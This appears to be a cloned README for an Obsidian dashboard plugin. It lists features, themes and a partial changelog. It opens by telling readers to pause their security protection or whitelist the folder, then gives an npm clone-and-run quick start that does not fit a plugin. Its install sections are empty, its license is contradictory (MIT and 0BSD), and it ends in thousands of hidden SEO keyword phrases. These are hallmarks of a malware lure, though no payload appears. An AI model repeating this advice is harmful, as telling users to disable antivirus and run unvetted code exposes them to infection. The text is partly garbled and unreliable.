# Apex Dashboard


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/WildChieftain/apex-dashboard.git
cd apex-dashboard
npm install
npm start
```


> Stop switching between Obsidian notes. One page. Everything you need. Memo your thoughts, crush your todos, track your projects — and make it look incredible doing it. [【中文版】](README_ZH.md)

## Screenshot

![Apex Dashboard](screenshot1.png)

## Features

### 🗒️ Memo
Capture thoughts instantly with a built-in memo pad. Each memo card has a writable textarea — jot down ideas, meeting notes, or daily reflections without leaving your dashboard. Supports `[[wikilinks]]` that render as clickable links.

### ✅ Todo
Manage tasks with interactive checklists. Add, reorder, drag-and-drop, and check off tasks. A progress bar shows completion percentage at a glance. Todo items also support `[[wikilinks]]` for cross-referencing notes.

### 📁 Projects
Organize your vault documents into project cards. Each card links to related notes, displays a cover image (supports both local vault images and web URLs), and supports inline document search to add new files quickly. Manage multiple file types including Markdown notes, PDFs, images, audio, and video.

### 📝 Notes
A compact, list-style section for organizing reference documents and quick-access files. Displays up to 5 cards per row without cover images for maximum density.

### ⚡ Quick Actions
Pin your most-used shortcuts to the sidebar. Supports two action types: **File** links to open any document, and **Command** shortcuts to trigger any Obsidian command. Includes built-in presets for New Journal and New Note.

### 🌤️ Sidebar Widgets
The left sidebar features decorative widgets for at-a-glance information:

- **Week Calendar** — A compact 7-day strip highlighting today's date
- **Weather Widget** — Real-time weather with current temperature, feels-like, humidity, wind speed, and a 5-day forecast with daily high/low temperatures. Powered by Open-Meteo (no API key needed). City search with geocoding autocomplete for precise location
- **Heatmap Widget** — Track daily frontmatter data (mood, sleep, etc.) as a GitHub-style contribution heatmap. Configurable summary: streak days (⚡), completion rate (✅), or both
- **Pomodoro Timer** — A focus timer with activity selector and session tracking. Start, pause, and stop timed sessions with a donut chart showing today's breakdown by activity
- **Reading Tracker** — Track your reading sessions with a built-in timer. Add books from Douban search or manual input, time your reading sessions, and record progress with page numbers. Each book card shows cover image, author, and reading progress bar
- **Countdown** — A customizable countdown to any target date, displayed as days or hours remaining

### 🎨 Banner
A customizable banner with an inspirational quote and optional background image. Supports both local vault images and web URLs. Double-click to edit.

### 🔄 Drag & Drop
Drag cards between sections to reorganize your workspace. Drag task items within Todo cards to reorder. Drag document links between project/note cards.

### 🧩 Custom Sections
Create sections with 4 built-in types — **Memo**, **Todo**, **Projects**, and **Notes** — each with its own layout and behavior. Mix and match to fit your workflow.

### 🕐 Recent Documents
The sidebar shows recently edited files with relative timestamps, so you can jump back into your latest work.

## Themes

![Themes Preview](screenshot2.png)
![Themes Preview](screenshot3.png)
![Themes Preview](screenshot4.png)

11 handcrafted themes, each with distinct visual identity:

| Theme | Style |
|-------|-------|
| **Earth** | Warm organic tones, parchment textures |
| **Nordic** | Clean minimal with blue accents |
| **Aurora** | Frosted glass with animated aurora gradient |
| **Spring** | Rose glass with warm glow |
| **Island** | Animal Crossing pastels, forest green and ocean blue |
| **Tundra** | Cold gray + avocado green aurora, sage glass cards |
| **Blossom** | Rose glass glow, transparent sections |
| **Haze** | Smoky white-to-blue mist, extreme glass transparency |
| **Ember** | Warm campfire smoke gradient, amber glow |
| **Dusk** | Purple twilight mist, cloud-soft rounded |
| **Jade** | Green bamboo mist, crisp jade-cut edges |

All themes support both Obsidian light and dark modes.

## Settings

- **Dashboard file** — customize the file path for your dashboard data
- **Style** — choose from 11 visual themes
- **Language** — English or Chinese interface
- **Recent documents count** — control how many recent files appear
- **Sidebar widgets** — Weather, Heatmap, Pomodoro, Reading, Countdown. Enable/disable and configure each widget independently
- **Reading settings** — Toggle reading tracker, enable/disable session completion sound


### From Obsidian Community Plugins
### Manual Installation
### 1.1.3
- **Mobile widget bar redesign** — Replaced the overlapping tab buttons with a collapsible strip below the banner. Tap the strip to reveal wider bookmark tabs (Pomodoro, Reading, Lunar), then tap a tab to expand its widget panel
- **Theme-aware tab colors** — Tab icons now transition from gray (inactive) to the theme primary text color (active), adapting to both light and dark themes
- **Updated widget icons** — Pomodoro uses hourglass icon, Lunar uses moon icon for clearer visual identity
- **Custom dialogs** — Replaced native browser dialogs with Obsidian-styled custom modals
- **Class rename** — Cleaned up internal class naming conventions
- **Style improvements** — Various visual polish and consistency fixes

### 1.1.2
- **Obsidian plugin review fixes** — Addressed feedback from the official Obsidian plugin review process
- **MIT license** — Changed license from ISC to MIT

- **Library config persistence** — Fixed a critical bug where library section configurations (filters, view mode, sort settings, page size) were lost after restarting Obsidian. The YAML parser now correctly handles nested objects in column definitions
- **Grid position persistence** — Fixed grid position (gcol/grow) values never being saved to the dashboard file, causing card positions to reset on reload
- **Write race condition fix** — Fixed a race condition where rapid updates could cause the file watcher to overwrite newer data with older content

- **Reading Tracker widget** — Full reading session management in the sidebar: add books from Douban search or manual input, start/pause/stop reading timer, and save sessions with page progress
- **Book cards** — Each active book displays cover image, title, author, reading progress bar, and today's reading time. Cover images support both web URLs and local vault paths
- **Edit book info** — Hover a book card to reveal edit (pencil) and remove (x) buttons. Edit modal supports changing title, author, total pages, and cover image URL/path
- **Reading statistics** — Full stats page with total reading time, today's reading, book count, streak days, book list by time range (week/month/year), and recent session records. Delete individual records or entire book histories
- **Pomodoro activity selector** — Activity selector moved to the timer title position with a dropdown picker for categorizing focus sessions
- **Pomodoro donut chart** — Visual breakdown of today's focus sessions by activity, displayed as a donut chart in the stats view

- **Sidebar weather widget** — Real-time weather with current temperature, feels-like temperature, humidity, wind speed, and a 5-day forecast (daily icons + high/low). Powered by Open-Meteo, no API key required
- **Sidebar heatmap widget** — GitHub-style contribution heatmap for tracking daily frontmatter data (mood, sleep, weight, etc.)
- **Heatmap summary** — Configurable stats below the heatmap: streak days (⚡), completion rate (✅), both, or off
- **Week calendar strip** — Compact 7-day strip in the sidebar highlighting today
- **City search** — Geocoding autocomplete when configuring the weather city in settings
- **Dashboard weather cards** — Weather card widgets in the main dashboard also show feels-like, humidity, and wind
- **i18n** — All sidebar widget settings now support both English and Chinese
- **5 new themes** — Matcha (green tea warmth), Lilac (soft purple), Sakura (cherry blossom pink), Eclipse (dark mode), Moonlight (silver blue)

- **Task reminders** — Set per-task reminders with a calendar popup. Click the bell icon on any task to pick a date and time
- **Calendar picker** — Visual month calendar with navigation, day selection, and hour/minute dropdowns (no manual date typing)
- **Overdue indicator** — Overdue task bell icon turns red with a pulse animation
- **Obsidian notifications** — 60-second periodic checker triggers an Obsidian Notice when a task is due
- **Inline markdown storage** — Reminders stored as `⏰ YYYY-MM-DD HH:MM` in task text, fully readable and editable in the markdown file
- **Island theme** — New Animal Crossing-inspired pastel theme with forest green sections and ocean blue accents
- **i18n** — Reminder UI supports both English and Chinese
- **Resizable section cards** — Drag to resize any card within a section, with min/max width constraints and persistent sizing
- **Collapsible sidebar** — Left sidebar is now resizable; click the pin button to fix it in place
- **6 new themes** — Tundra (sage green aurora), Blossom (rose glass, transparent sections), Haze (smoky blue mist, glass transparency), Ember (warm campfire smoke), Dusk (purple twilight mist), Jade (green bamboo mist)
- **Transparent sections** — Tundra, Blossom, Haze, Ember, Dusk, and Jade feature borderless transparent sections with floating cards
- **Banner overlay removed** — Banner images no longer covered by a dark overlay filter
- **Faster banner rotation** — Quotes rotate every 1 hour, images every 30 minutes

- **Multi-quote banner** — Store multiple quotes in the banner, each with its own author. Add, edit, and delete quotes in the edit modal
- **Banner image rotation** — Add multiple background images that rotate every 2 hours with a smooth fade transition
- **Quote auto-rotation** — Quotes rotate every 2 hours (offset 1 hour from image rotation so they never swap simultaneously)
- **Double-click rename sections** — Double-click any section title to rename it inline (Enter to save, Escape to cancel)
- **Collapsible sections** — Click the triangle indicator on section headers to collapse/expand sections. Collapse state persists across sessions
- **Cross-card drag & drop** — Drag document links between project/note cards, and drag task items between todo cards
- **Card reordering fix** — Fixed card drag-and-drop positioning in all sections (Todo, Projects, Notes). Cards now land exactly where you drop them instead of always moving to the first position
- **Empty card interaction** — Cards with all items removed can now receive new items via drag-and-drop or the add input
- **Mobile improvements** — Memo color picker button hidden on mobile, mobile drawer uses solid background for all themes, taller quick actions list

- **Distinct toggle colors** — Each section type (Memo, Todo, Projects, Notes) has its own triangle indicator color
- **Banner modal button sizing** — "Add quote" and "Add image" buttons in the banner edit modal now use fit-content width instead of stretching full width
- **Projects card default width** — Fixed new project cards stretching across the entire section; cards now have a proper default width (280px)
- **Section type robustness** — Three-layer defense for section type preservation: frontmatter `type:` field, name-based heuristics, and card type distribution analysis. Section types survive manual file edits, heading renames, and position swaps
- **Project card type persistence** — `type: project` is now written to the file and preserved across save/reload cycles, preventing cards from reverting to generic type
- **Default template fix** — Projects and Library sections now include `sectionType` in the default template and column definitions

- **Quick Actions** — Quick Links upgraded to Quick Actions, supporting both file links and Obsidian command shortcuts
- **Add Action modal** — Two tabs (File / Command) for adding custom actions, with built-in presets for New Journal and New Note
- **4 Section types** — Memo, Todo, Projects, and Notes, each with its own layout and behavior
- **Multi-format document support** — Manage Markdown, PDF, images (PNG, JPG, GIF, SVG, WebP), audio (MP3, M4A), and video (MP4, MOV) in project cards
- **Bidirectional links** — Memo and Todo cards render `[[wikilinks]]` as clickable links with basename fallback
- **Journal path setting** — Configure where new diary entries are saved
- **UI polish** — Vertical scrollbars hidden on desktop, theme-colored horizontal scrollbar, notes section layout optimization
- **Bug fixes** — Fixed wiki link clicks in memo cards, quick link rename race condition, rename listener cleanup on plugin unload

- **Wikilink support** — Memo and Todo cards now render `[[wikilinks]]` as clickable links
- **Section type selector** — Choose section type when creating new sections
- **Mobile sidebar drawer** — Slide-in animation for mobile navigation
- **Section creation UX** — Confirm button for mobile section creation, 'Add new section' command shortcut
- **Bug fixes** — Card drag restricted to header/cover area, mobile banner edit button, drawer alignment

- **Section management** — Manual section deletion, section type selector
- **Mobile improvements** — Better card scrolling and mobile layout
- **Bug fixes** — Respect body section order, form reset prevention

## Compatibility

- Desktop and mobile
- All themes work in both light and dark Obsidian modes

## License

0BSD


<!-- nodejs npm javascript typescript package module library framework windows linux macos -->
<!-- apex-dashboard - tool utility software - download install setup -->
<!-- run on linux apex-dashboard addon | use apex-dashboard application | self hosted apex-dashboard gui | how to build apex-dashboard debugger | apex-dashboard binding | download for linux apex-dashboard | github apex-dashboard | apex-dashboard downloader | simple apex-dashboard desktop | launch apex-dashboard analyzer | download for windows apex-dashboard encoder | git clone apex-dashboard software | how to download apex-dashboard binding | apex dashboard ci cd | fast apex-dashboard tracker | 2025 apex-dashboard client | configure apex-dashboard builder | portable apex-dashboard | github apex-dashboard library | updated native apex-dashboard | use apex-dashboard web | apex-dashboard plugin | ubuntu apex-dashboard | extensible apex-dashboard editor | open apex-dashboard extractor | minimal apex-dashboard uploader | sample apex-dashboard program | deploy best apex-dashboard | build apex-dashboard | download for linux apex-dashboard framework | download for windows apex-dashboard | windows apex-dashboard package | run on linux apex-dashboard | apex-dashboard replacement | example apex-dashboard web | download apex-dashboard reader | apex dashboard course | use apex-dashboard app | local apex-dashboard tester | best apex-dashboard package | apex dashboard tutorial | build apex-dashboard builder | how to setup modular apex-dashboard | how to use apex-dashboard program | zip apex-dashboard | zip low latency apex-dashboard | zip apex-dashboard replacement | build reliable apex-dashboard | how to use apex-dashboard | modern apex-dashboard web -->
<!-- simple apex-dashboard service | apex-dashboard mirror | apex-dashboard port | get apex-dashboard cli | top apex-dashboard scanner | apex dashboard cloud | build extensible apex-dashboard | simple apex-dashboard tool | open source apex-dashboard client | download for mac apex-dashboard mobile | source code apex-dashboard server | apex-dashboard app | offline apex-dashboard mobile | source code apex-dashboard alternative | walkthrough apex-dashboard encoder | centos apex-dashboard | build apex-dashboard extractor | production ready apex-dashboard scanner | local apex-dashboard viewer | updated apex-dashboard generator | github apex-dashboard package | apex-dashboard desktop | get apex-dashboard web | how to deploy apex-dashboard server | download for windows secure apex-dashboard optimizer | apex dashboard error | online apex-dashboard sdk | free download lightweight apex-dashboard | open apex-dashboard mobile | build top apex-dashboard scanner | how to use free apex-dashboard | 2025 modular apex-dashboard | setup apex-dashboard generator | online apex-dashboard | fedora advanced apex-dashboard server | 2026 offline apex-dashboard | examples apex-dashboard tester | how to install apex-dashboard port | apex dashboard blog | build advanced apex-dashboard | github apex-dashboard wrapper | tar.gz apex-dashboard sdk | ubuntu apex-dashboard platform | download apex-dashboard | customizable apex-dashboard program | setup apex-dashboard | native apex-dashboard wrapper | apex dashboard alternative | tutorial apex-dashboard | examples apex-dashboard mirror -->
<!-- portable apex-dashboard alternative | open apex-dashboard application | getting started apex-dashboard client | simple apex-dashboard api | tutorial minimal apex-dashboard | centos apex-dashboard tool | free apex-dashboard module | start apex-dashboard uploader | docs fast apex-dashboard | open apex-dashboard client | ubuntu apex-dashboard addon | macos apex-dashboard | open source apex-dashboard fork | advanced apex-dashboard copy | get advanced apex-dashboard | high performance apex-dashboard downloader | download advanced apex-dashboard | apex-dashboard tester | apex dashboard guide | apex-dashboard logger | reliable apex-dashboard server | examples cross platform apex-dashboard | open source apex-dashboard mobile | apex-dashboard library | fedora apex-dashboard | macos apex-dashboard tester | build apex-dashboard validator | latest version apex-dashboard module | modern apex-dashboard package | build apex-dashboard program | apex dashboard reference | execute apex-dashboard platform | extensible apex-dashboard tracker | example apex-dashboard | apex dashboard cheat sheet | start apex-dashboard viewer | reliable apex-dashboard framework | run on mac apex-dashboard plugin | wiki apex-dashboard validator | arch apex-dashboard desktop | open offline apex-dashboard module | docs extensible apex-dashboard package | reliable apex-dashboard engine | docs apex-dashboard program | reliable apex-dashboard application | native apex-dashboard validator | tar.gz apex-dashboard | walkthrough apex-dashboard mirror | install online apex-dashboard framework | apex-dashboard compressor -->
<!-- tar.gz lightweight apex-dashboard | arch apex-dashboard parser | apex-dashboard validator | examples apex-dashboard software | ubuntu apex-dashboard server | install apex-dashboard api | top apex-dashboard fork | docs apex-dashboard | build apex-dashboard generator | how to build apex-dashboard application | run modular apex-dashboard framework | low latency apex-dashboard reader | beginner top apex-dashboard | how to install github apex-dashboard | get apex-dashboard utility | arch apex-dashboard | apex-dashboard cli | ubuntu apex-dashboard gui | how to setup safe apex-dashboard | production ready apex-dashboard fork | run apex-dashboard software | run on mac apex-dashboard reader | download apex-dashboard optimizer | compile modern apex-dashboard | best apex-dashboard replacement | high performance apex-dashboard utility | arch native apex-dashboard | modern apex-dashboard alternative | apex-dashboard copy | offline apex-dashboard server | open source apex-dashboard port | linux apex-dashboard downloader | beginner apex-dashboard builder | updated apex-dashboard tool | free download apex-dashboard engine | apex-dashboard application | compile apex-dashboard | powerful apex-dashboard tool | windows apex-dashboard addon | launch apex-dashboard parser | how to deploy apex-dashboard | windows apex-dashboard | simple apex-dashboard uploader | modern apex-dashboard platform | guide apex-dashboard checker | deploy apex-dashboard plugin | run apex-dashboard framework | open source extensible apex-dashboard | apex-dashboard analyzer | secure apex-dashboard mobile -->
<!-- minimal apex-dashboard service | arch modular apex-dashboard | best apex-dashboard compressor | walkthrough online apex-dashboard | cross platform apex-dashboard decoder | online apex-dashboard downloader | run on windows apex-dashboard mirror | run on windows apex-dashboard analyzer | run on mac apex-dashboard port | apex dashboard fix | simple apex-dashboard cli | git clone apex-dashboard | offline apex-dashboard clone | example apex-dashboard desktop | how to run apex-dashboard | high performance apex-dashboard checker | how to setup apex-dashboard | local apex-dashboard addon | lightweight apex-dashboard mobile | install apex-dashboard desktop | safe apex-dashboard | top apex-dashboard | updated apex-dashboard analyzer | download for linux apex-dashboard monitor | run apex-dashboard editor | new version apex-dashboard platform | get apex-dashboard | how to configure apex-dashboard module | download for linux portable apex-dashboard converter | free lightweight apex-dashboard generator | native apex-dashboard tool | powerful apex-dashboard extension | download for windows safe apex-dashboard | apex-dashboard mobile | linux top apex-dashboard | secure apex-dashboard extension | customizable apex-dashboard alternative | modular apex-dashboard | download for linux apex-dashboard utility | how to use apex-dashboard app | linux apex-dashboard compressor | new version powerful apex-dashboard | linux apex-dashboard | download for mac modern apex-dashboard | local apex-dashboard engine | how to download local apex-dashboard | how to deploy portable apex-dashboard api | download for mac apex-dashboard optimizer | build top apex-dashboard | modern apex-dashboard -->
<!-- apex dashboard docker | online apex-dashboard addon | offline apex-dashboard mirror | execute apex-dashboard sdk | quickstart online apex-dashboard | apex dashboard support | setup advanced apex-dashboard binding | how to install apex-dashboard | zip offline apex-dashboard | updated apex-dashboard mirror | tutorial apex-dashboard module | demo apex-dashboard reader | secure apex-dashboard addon | open portable apex-dashboard desktop | reliable apex-dashboard uploader | online apex-dashboard scanner | centos apex-dashboard software | debian apex-dashboard scanner | apex dashboard handbook | apex dashboard setup | latest version best apex-dashboard | download for windows customizable apex-dashboard copy | download for windows apex-dashboard compressor | simple apex-dashboard downloader | source code apex-dashboard | local apex-dashboard alternative | guide lightweight apex-dashboard | debian apex-dashboard decoder | free apex-dashboard plugin | setup stable apex-dashboard tester | centos production ready apex-dashboard encoder | execute lightweight apex-dashboard | install free apex-dashboard generator | apex-dashboard client | powerful apex-dashboard | 2025 apex-dashboard | download for mac apex-dashboard software | quickstart apex-dashboard plugin | portable apex-dashboard tester | configure best apex-dashboard | latest version apex-dashboard | new version apex-dashboard downloader | free apex-dashboard editor | is apex dashboard legit | apex dashboard book | execute apex-dashboard encoder | build local apex-dashboard | execute apex-dashboard decoder | free download apex-dashboard software | how to download top apex-dashboard clone -->
<!-- how to deploy apex-dashboard editor | self hosted apex-dashboard creator | apex dashboard github | deploy apex-dashboard port | start github apex-dashboard | advanced apex-dashboard debugger | how to install apex-dashboard engine | how to download apex-dashboard copy | install apex-dashboard | extensible apex-dashboard library | secure apex-dashboard scanner | minimal apex-dashboard package | examples apex-dashboard builder | apex-dashboard framework | minimal apex-dashboard reader | sample apex-dashboard checker | run apex-dashboard tracker | apex-dashboard service | beginner apex-dashboard converter | launch cross platform apex-dashboard | easy apex-dashboard wrapper | apex-dashboard creator | use simple apex-dashboard | best apex-dashboard plugin | secure apex-dashboard software | customizable apex-dashboard | top apex-dashboard builder | get apex-dashboard framework | install portable apex-dashboard | updated apex-dashboard checker | centos reliable apex-dashboard | download for windows apex-dashboard clone | production ready apex-dashboard client | windows modular apex-dashboard | compile apex-dashboard tool | fedora apex-dashboard mirror | run on mac apex-dashboard module | apex dashboard best practice | setup apex-dashboard port | configurable apex-dashboard | getting started offline apex-dashboard | how to use apex-dashboard clone | portable apex-dashboard creator | fedora apex-dashboard addon | compile offline apex-dashboard | stable apex-dashboard | configure apex-dashboard service | quickstart apex-dashboard optimizer | free download apex-dashboard | open source top apex-dashboard -->
<!-- deploy apex-dashboard copy | getting started apex-dashboard desktop | updated low latency apex-dashboard | low latency apex-dashboard gui | free download apex-dashboard wrapper | 2026 apex-dashboard validator | tutorial apex-dashboard validator | start fast apex-dashboard port | github apex-dashboard application | how to use apex-dashboard parser | execute apex-dashboard generator | run on linux apex-dashboard uploader | configurable apex-dashboard binding | apex-dashboard server | install apex-dashboard sdk | getting started apex-dashboard binding | install self hosted apex-dashboard | ubuntu advanced apex-dashboard validator | documentation apex-dashboard module | new version apex-dashboard alternative | execute customizable apex-dashboard downloader | apex-dashboard checker | launch extensible apex-dashboard | launch apex-dashboard encoder | download for windows modular apex-dashboard decoder | tutorial apex-dashboard copy | configure apex-dashboard converter | demo apex-dashboard | run on mac apex-dashboard | modern apex-dashboard viewer | easy apex-dashboard analyzer | apex-dashboard builder | apex-dashboard software | apex dashboard not working | 2026 production ready apex-dashboard downloader | how to run production ready apex-dashboard | extensible apex-dashboard debugger | compile apex-dashboard mirror | free apex-dashboard | local apex-dashboard sdk | apex dashboard devops | secure apex-dashboard cli | windows apex-dashboard sdk | apex-dashboard web | apex dashboard example | tar.gz apex-dashboard cli | updated apex-dashboard | extensible apex-dashboard extractor | tutorial fast apex-dashboard | walkthrough apex-dashboard cli -->
<!-- run on mac github apex-dashboard | linux apex-dashboard scanner | free download apex-dashboard checker | how to configure apex-dashboard | get apex-dashboard monitor | offline apex-dashboard extension | updated online apex-dashboard | reliable apex-dashboard addon | offline apex-dashboard software | deploy extensible apex-dashboard uploader | beginner apex-dashboard gui | extensible apex-dashboard logger | offline apex-dashboard wrapper | easy apex-dashboard | beginner safe apex-dashboard | launch github apex-dashboard | 2026 apex-dashboard mirror | configure apex-dashboard framework | cross platform apex-dashboard addon | download for windows apex-dashboard scanner | git clone apex-dashboard port | documentation apex-dashboard creator | how to install apex-dashboard tool | how to setup low latency apex-dashboard | top apex dashboard | run apex-dashboard | how to download apex-dashboard editor | demo apex-dashboard app | 2026 fast apex-dashboard | extensible apex-dashboard | apex dashboard workflow | configure apex-dashboard tool | how to configure apex-dashboard app | guide apex-dashboard extractor | minimal apex-dashboard binding | extensible apex-dashboard port | arch apex-dashboard uploader | apex-dashboard converter | apex-dashboard editor | run on windows apex-dashboard uploader | how to setup apex-dashboard software | offline apex-dashboard module | top apex-dashboard monitor | run on linux portable apex-dashboard app | examples apex-dashboard logger | simple apex-dashboard editor | quick start configurable apex-dashboard web | source code apex-dashboard software | how to install apex-dashboard program | apex dashboard bug -->
<!-- sample apex-dashboard | apex-dashboard monitor | apex-dashboard sdk | latest version apex-dashboard addon | start apex-dashboard mobile | tar.gz apex-dashboard web | debian apex-dashboard copy | local apex-dashboard utility | how to run apex-dashboard port | apex dashboard test | secure apex-dashboard gui | lightweight apex-dashboard tool | docs apex-dashboard monitor | guide apex-dashboard parser | install apex-dashboard mirror | self hosted apex-dashboard program | cross platform apex-dashboard engine | open source free apex-dashboard | download apex-dashboard tester | centos apex-dashboard checker | modern apex-dashboard converter | demo high performance apex-dashboard module | how to build apex-dashboard | apex dashboard reddit | apex-dashboard gui | centos native apex-dashboard builder | linux online apex-dashboard | run on linux apex-dashboard validator | safe apex-dashboard package | wiki apex-dashboard addon | setup open source apex-dashboard | zip apex-dashboard extension | new version apex-dashboard mobile | how to use powerful apex-dashboard | get fast apex-dashboard | free download apex-dashboard package | windows apex-dashboard generator | apex dashboard automation | beginner apex-dashboard program | setup apex-dashboard alternative | latest version apex-dashboard analyzer | documentation apex-dashboard gui | local apex-dashboard extractor | quick start apex-dashboard builder | centos self hosted apex-dashboard scanner | 2026 apex-dashboard gui | wiki apex-dashboard api | quickstart easy apex-dashboard | getting started extensible apex-dashboard | demo offline apex-dashboard -->

<!-- Last updated: 2026-06-09 19:32:13 -->
